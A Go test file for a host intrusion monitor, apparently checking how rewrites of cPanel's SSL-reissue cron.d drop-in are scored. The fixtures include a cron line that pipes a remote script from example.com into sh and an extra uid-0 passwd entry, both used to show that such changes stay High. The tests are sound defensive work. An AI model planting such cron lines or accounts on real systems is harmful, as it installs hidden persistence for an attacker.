package checks

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/state"
)

const (
	panelReissueCronD   = "/etc/cron.d/cpanel_ssl_reissue"
	scheduleDemoteNote  = "only cron job run times changed"
	panelReissueCommand = "/usr/local/cpanel/bin/process_ssl_reissue"
)

// dailyPanelJob is the shape cPanel's nightly maintenance leaves in its SSL
// reissue drop-in: the same job with a fresh random minute and hour.
func dailyPanelJob(minute, hour int) string {
	return fmt.Sprintf("%d\t%d\t*\t*\t*\troot\t%s\n", minute, hour, panelReissueCommand)
}

// withoutWriterProvenance removes the package window and ancestry evidence so
// only the change itself can decide the severity.
func withoutWriterProvenance(t *testing.T) {
	t.Helper()
	oldLogs := pkgManagerLogs
	pkgManagerLogs = []string{filepath.Join(t.TempDir(), "missing.log")}
	oldProbe := AncestryProvenance
	AncestryProvenance = nil
	t.Cleanup(func() {
		pkgManagerLogs = oldLogs
		AncestryProvenance = oldProbe
	})
}

// runCronDOnce runs the scheduled cron.d diff over one drop-in holding content.
func runCronDOnce(t *testing.T, store *state.Store, path, content string) []alert.Finding {
	t.Helper()
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/etc/cron.d/*" {
				return []string{path}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{path: time.Now()}),
		readFile: func(name string) ([]byte, error) {
			if name == path {
				return []byte(content), nil
			}
			return nil, os.ErrNotExist
		},
	})
	return CheckCrontabs(context.Background(), &config.Config{}, store)
}

// cronDRewrite baselines before, then reports the change to after.
func cronDRewrite(t *testing.T, before, after string) alert.Finding {
	t.Helper()
	store := newCrontabTestStore(t)
	if findings := runCronDOnce(t, store, panelReissueCronD, before); len(findings) != 0 {
		t.Fatalf("baseline pass reported %+v", findings)
	}
	return cronDFinding(t, runCronDOnce(t, store, panelReissueCronD, after))
}

// cPanel moves its SSL reissue job to a new random time every night, usually
// minutes after the last package-log write. The scheduled diff has no writer
// pid, so it paged High every night while the live write of the same file
// was Warning. A change that only moves the time of an already observed
// daily job adds nothing that can run.
func TestCronDScheduleOnlyRewriteDemoted(t *testing.T) {
	withoutWriterProvenance(t)

	got := cronDRewrite(t, dailyPanelJob(17, 3), dailyPanelJob(42, 0))
	if got.Severity != alert.Warning {
		t.Fatalf("severity = %v, want Warning for a schedule-only rewrite", got.Severity)
	}
	if !strings.Contains(got.Details, scheduleDemoteNote) {
		t.Fatalf("details %q do not name the demotion evidence", got.Details)
	}
}

// The comparison follows cron's own syntax for this shape, so separators,
// zero-padded times, surrounding lines and several moved jobs all qualify.
func TestCronDScheduleOnlyRewriteAcceptsCronSyntax(t *testing.T) {
	withoutWriterProvenance(t)

	other := "/usr/local/cpanel/bin/other"
	cases := []struct {
		name, before, after string
	}{
		{"blank separated", "17 3 * * * root " + panelReissueCommand + "\n", "42 0 * * * root " + panelReissueCommand + "\n"},
		{"zero padded", "07 03 * * * root " + panelReissueCommand + "\n", "42 0 * * * root " + panelReissueCommand + "\n"},
		{"environment and comments kept", "MAILTO=root\n# managed\n" + dailyPanelJob(17, 3), "MAILTO=root\n# managed\n" + dailyPanelJob(42, 0)},
		{"two jobs moved", dailyPanelJob(17, 3) + "5 4 * * 0 root " + other + "\n", dailyPanelJob(42, 0) + "9 1 * * 0 root " + other + "\n"},
		{"no final newline", strings.TrimSuffix(dailyPanelJob(17, 3), "\n"), strings.TrimSuffix(dailyPanelJob(59, 23), "\n")},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := cronDRewrite(t, tc.before, tc.after); got.Severity != alert.Warning {
				t.Fatalf("severity = %v, want Warning for %q -> %q", got.Severity, tc.before, tc.after)
			}
		})
	}
}

// Anything beyond moving a daily job within its day keeps the finding High:
// a new command, a new job, a job that runs more often or on other days, a
// dormant job that starts running, and any environment or user change.
func TestCronDScheduleDemotionRefusesOtherChanges(t *testing.T) {
	withoutWriterProvenance(t)

	job := dailyPanelJob(17, 3)
	cases := []struct {
		name, before, after string
	}{
		{"command changed", job, "42\t0\t*\t*\t*\troot\t/usr/local/cpanel/bin/other\n"},
		{"argument added", job, strings.TrimSuffix(dailyPanelJob(42, 0), "\n") + " --force\n"},
		{"job appended", job, dailyPanelJob(42, 0) + "*/5 * * * * root /opt/example/agent\n"},
		{"minute widened to every minute", job, "*\t0\t*\t*\t*\troot\t" + panelReissueCommand + "\n"},
		{"hour widened to a list", job, "42\t0,12\t*\t*\t*\troot\t" + panelReissueCommand + "\n"},
		{"hour list moved", "17\t3,12\t*\t*\t*\troot\t" + panelReissueCommand + "\n", "42\t0,12\t*\t*\t*\troot\t" + panelReissueCommand + "\n"},
		{"day of month changed", job, "42\t0\t1\t*\t*\troot\t" + panelReissueCommand + "\n"},
		{"dormant job activated", "17\t25\t*\t*\t*\troot\t" + panelReissueCommand + "\n", job},
		{"minute out of range", job, dailyPanelJob(75, 0)},
		{"placeholder written literally", "M\tH\t*\t*\t*\troot\t" + panelReissueCommand + "\n", job},
		{"environment line added", job, "SHELL=/opt/example/sh\n" + dailyPanelJob(42, 0)},
		{"environment line moved before the job", dailyPanelJob(17, 3) + "SHELL=/bin/sh\n", "SHELL=/bin/sh\n" + dailyPanelJob(42, 0)},
		{"user changed", job, "42\t0\t*\t*\t*\texample\t" + panelReissueCommand + "\n"},
		{"logging modifier added", job, "-" + dailyPanelJob(42, 0)},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := cronDRewrite(t, tc.before, tc.after)
			if got.Severity != alert.High {
				t.Fatalf("severity = %v, want High for %q -> %q", got.Severity, tc.before, tc.after)
			}
			if strings.Contains(strings.ToLower(got.Details), "demoted") {
				t.Fatalf("details carry a demotion reason: %q", got.Details)
			}
		})
	}
}

// Moving a job that carries known persistence is still vetoed.
func TestCronDScheduleDemotionKeepsDangerVeto(t *testing.T) {
	withoutWriterProvenance(t)

	got := cronDRewrite(t,
		"17 3 * * * root curl -s https://example.com/x | sh\n",
		"42 0 * * * root curl -s https://example.com/x | sh\n")
	if got.Severity != alert.High {
		t.Fatalf("severity = %v, want High: persistence tokens veto the demote", got.Severity)
	}
}

// A drop-in whose previous version was never fingerprinted -- the first
// change after an upgrade -- has nothing to compare against and stays High.
func TestCronDScheduleDemotionNeedsObservedBaseline(t *testing.T) {
	withoutWriterProvenance(t)

	store := newCrontabTestStore(t)
	store.SetRaw("_crond:"+filepath.Base(panelReissueCronD), hashBytes([]byte(dailyPanelJob(17, 3))))
	got := cronDFinding(t, runCronDOnce(t, store, panelReissueCronD, dailyPanelJob(42, 0)))
	if got.Severity != alert.High {
		t.Fatalf("severity = %v, want High without a recorded schedule fingerprint", got.Severity)
	}
}

// An unchanged pass records the fingerprint, so a drop-in the daemon has
// watched once before the rewrite is covered after an upgrade.
func TestCronDScheduleFingerprintRecordedOnUnchangedPass(t *testing.T) {
	withoutWriterProvenance(t)

	store := newCrontabTestStore(t)
	before := dailyPanelJob(17, 3)
	store.SetRaw("_crond:"+filepath.Base(panelReissueCronD), hashBytes([]byte(before)))
	if findings := runCronDOnce(t, store, panelReissueCronD, before); len(findings) != 0 {
		t.Fatalf("unchanged pass reported %+v", findings)
	}
	got := cronDFinding(t, runCronDOnce(t, store, panelReissueCronD, dailyPanelJob(42, 0)))
	if got.Severity != alert.Warning {
		t.Fatalf("severity = %v, want Warning once the fingerprint was recorded", got.Severity)
	}
}

// A new drop-in has no previous version, so the schedule evidence never
// applies to it.
func TestCronDAddedFileNeverScheduleDemoted(t *testing.T) {
	withoutWriterProvenance(t)

	store := newCrontabTestStore(t)
	store.SetRaw(cronDBaselineKey, "1")
	got := cronDFinding(t, runCronDOnce(t, store, panelReissueCronD, dailyPanelJob(42, 0)))
	if got.Severity != alert.High || got.Message != "Cron.d file added: "+panelReissueCronD {
		t.Fatalf("finding = %+v; want a High added-file finding", got)
	}
}

// watchsetRewrite runs two refresh snapshots of one watchset path over the
// mocked filesystem and returns the findings for the second.
func watchsetRewrite(t *testing.T, path, before, after string) []alert.Finding {
	t.Helper()
	content := before
	oldOS := osFS
	osFS = sensitiveRegularMock(func(name string) ([]byte, error) {
		if name == path {
			return []byte(content), nil
		}
		return nil, os.ErrNotExist
	})
	t.Cleanup(func() { osFS = oldOS })

	prev, _ := NextSensitiveDigests(nil, []string{path})
	content = after
	cur, contents := NextSensitiveDigests(prev, []string{path})
	return DiffSensitiveWatchset(prev, cur, contents, nil)
}

// The watchset refresh diff scores the same file with no writer pid either.
func TestSensitiveWatchsetScheduleOnlyRewriteDemoted(t *testing.T) {
	withoutWriterProvenance(t)

	findings := watchsetRewrite(t, panelReissueCronD, dailyPanelJob(17, 3), dailyPanelJob(42, 0))
	got := findingFor(t, findings, panelReissueCronD)
	if got.Severity != alert.Warning || !strings.Contains(got.Details, scheduleDemoteNote) {
		t.Fatalf("finding = %+v; want Warning naming the schedule evidence", got)
	}
}

func TestSensitiveWatchsetScheduleDemotionRefusesCommandChange(t *testing.T) {
	withoutWriterProvenance(t)

	findings := watchsetRewrite(t, panelReissueCronD, dailyPanelJob(17, 3), dailyPanelJob(42, 0)+"* * * * * root /opt/example/agent\n")
	if got := findingFor(t, findings, panelReissueCronD); got.Severity != alert.High {
		t.Fatalf("finding = %+v; want High for an added job", got)
	}
}

// The demotion is only as good as the danger-token veto run on the same
// bytes. Without the bytes behind the new digest there is nothing to veto
// on, so the change stays High.
func TestSensitiveWatchsetScheduleDemotionNeedsContent(t *testing.T) {
	withoutWriterProvenance(t)

	content := "17 3 * * * root curl -s https://example.com/x | sh\n"
	oldOS := osFS
	osFS = sensitiveRegularMock(func(name string) ([]byte, error) {
		if name == panelReissueCronD {
			return []byte(content), nil
		}
		return nil, os.ErrNotExist
	})
	t.Cleanup(func() { osFS = oldOS })

	prev, _ := NextSensitiveDigests(nil, []string{panelReissueCronD})
	content = "42 0 * * * root curl -s https://example.com/x | sh\n"
	cur, _ := NextSensitiveDigests(prev, []string{panelReissueCronD})
	got := findingFor(t, DiffSensitiveWatchset(prev, cur, nil, nil), panelReissueCronD)
	if got.Severity != alert.High {
		t.Fatalf("finding = %+v; want High when the changed bytes are not available", got)
	}
}

// The fingerprint reads the system crontab format. A user crontab or a
// run-parts script uses the same bytes differently -- in a script the leading
// numbers are a command and its argument -- so neither earns the demotion.
func TestSensitiveWatchsetScheduleDemotionOnlyForCronD(t *testing.T) {
	withoutWriterProvenance(t)

	for _, path := range []string{"/var/spool/cron/root", "/etc/cron.daily/example"} {
		findings := watchsetRewrite(t, path, "17 3 * * * root /usr/local/bin/job\n", "42 0 * * * root /usr/local/bin/job\n")
		if got := findingFor(t, findings, path); got.Severity != alert.High {
			t.Fatalf("%s: finding = %+v; want High outside cron.d", path, got)
		}
	}
}

// A metadata change in the same refresh (owner, mode, symlink target) is
// its own evidence and is never excused by the content comparison.
func TestSensitiveWatchsetScheduleDemotionRefusesIdentityChange(t *testing.T) {
	withoutWriterProvenance(t)

	path := panelReissueCronD
	content := dailyPanelJob(17, 3)
	mode := os.FileMode(0o600)
	oldOS := osFS
	osFS = &mockOS{
		readRegularFile: func(name string) ([]byte, error) {
			if name == path {
				return []byte(content), nil
			}
			return nil, os.ErrNotExist
		},
		lstat: func(name string) (os.FileInfo, error) {
			return sensitiveTestFileInfo{name: filepath.Base(name), mode: mode}, nil
		},
	}
	t.Cleanup(func() { osFS = oldOS })

	prev, _ := NextSensitiveDigests(nil, []string{path})
	content = dailyPanelJob(42, 0)
	mode = 0o666
	cur, contents := NextSensitiveDigests(prev, []string{path})
	got := findingFor(t, DiffSensitiveWatchset(prev, cur, contents, nil), path)
	if got.Severity != alert.High {
		t.Fatalf("finding = %+v; want High when the path identity changed too", got)
	}
}

// The periodic fallback used without the BPF monitor compares the same way.
func TestCheckSensitiveFilesScheduleOnlyRewriteDemoted(t *testing.T) {
	withoutWriterProvenance(t)

	root := t.TempDir()
	oldWatchset := sensitiveWatchset
	sensitiveWatchset = []string{filepath.Join(root, "etc/cron.d/*")}
	t.Cleanup(func() { sensitiveWatchset = oldWatchset })
	cronD := filepath.Join(root, "etc/cron.d")
	if err := os.MkdirAll(cronD, 0o755); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(cronD, "cpanel_ssl_reissue")
	write := func(content string) {
		t.Helper()
		if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	store := newCrontabTestStore(t)
	for _, tc := range []struct {
		name, content string
		want          alert.Severity
	}{
		{"schedule only", dailyPanelJob(42, 0), alert.Warning},
		{"job appended", dailyPanelJob(42, 0) + "* * * * * root /opt/example/agent\n", alert.High},
	} {
		t.Run(tc.name, func(t *testing.T) {
			write(dailyPanelJob(17, 3))
			CheckSensitiveFiles(context.Background(), nil, store)
			write(tc.content)
			findings := CheckSensitiveFiles(context.Background(), nil, store)
			if len(findings) != 1 {
				t.Fatalf("want one finding, got %+v", findings)
			}
			if got := findings[0]; got.Severity != tc.want {
				t.Fatalf("finding = %+v; want %v", got, tc.want)
			}
		})
	}
}

// The writer evidence keeps precedence in the recorded reason, so an operator
// reading the finding sees the stronger signal when both hold.
func TestCronDScheduleDemotionKeepsPackageWindowReason(t *testing.T) {
	pkgLog := filepath.Join(t.TempDir(), "dnf.rpm.log")
	if err := os.WriteFile(pkgLog, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	oldLogs := pkgManagerLogs
	pkgManagerLogs = []string{pkgLog}
	t.Cleanup(func() { pkgManagerLogs = oldLogs })

	got := cronDRewrite(t, dailyPanelJob(17, 3), dailyPanelJob(42, 0))
	if got.Severity != alert.Warning || !strings.Contains(got.Details, "package manager active within window") || strings.Contains(got.Details, scheduleDemoteNote) {
		t.Fatalf("finding = %+v; want only the package window reason", got)
	}
}

// Only a cron.d file has a fingerprint. The periodic fallback must not read
// two missing fingerprints as an unchanged schedule for any other path.
func TestCheckSensitiveFilesScheduleDemotionOnlyForCronD(t *testing.T) {
	withoutWriterProvenance(t)

	root := t.TempDir()
	oldWatchset := sensitiveWatchset
	sensitiveWatchset = []string{filepath.Join(root, "etc/passwd"), filepath.Join(root, "var/spool/cron/*")}
	t.Cleanup(func() { sensitiveWatchset = oldWatchset })
	passwd := filepath.Join(root, "etc/passwd")
	spool := filepath.Join(root, "var/spool/cron/example")
	for _, dir := range []string{filepath.Dir(passwd), filepath.Dir(spool)} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	write := func(path, content string) {
		t.Helper()
		if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	store := newCrontabTestStore(t)
	write(passwd, "root:x:0:0:root:/root:/bin/bash\n")
	write(spool, "17 3 * * * /usr/local/bin/job\n")
	CheckSensitiveFiles(context.Background(), nil, store)
	write(passwd, "root:x:0:0:root:/root:/bin/bash\nexample:x:0:0::/root:/bin/bash\n")
	write(spool, "42 0 * * * /usr/local/bin/job\n")
	findings := CheckSensitiveFiles(context.Background(), nil, store)
	if len(findings) != 2 {
		t.Fatalf("want two findings, got %+v", findings)
	}
	for _, f := range findings {
		if f.Severity != alert.High {
			t.Fatalf("finding = %+v; want High outside cron.d", f)
		}
	}
}
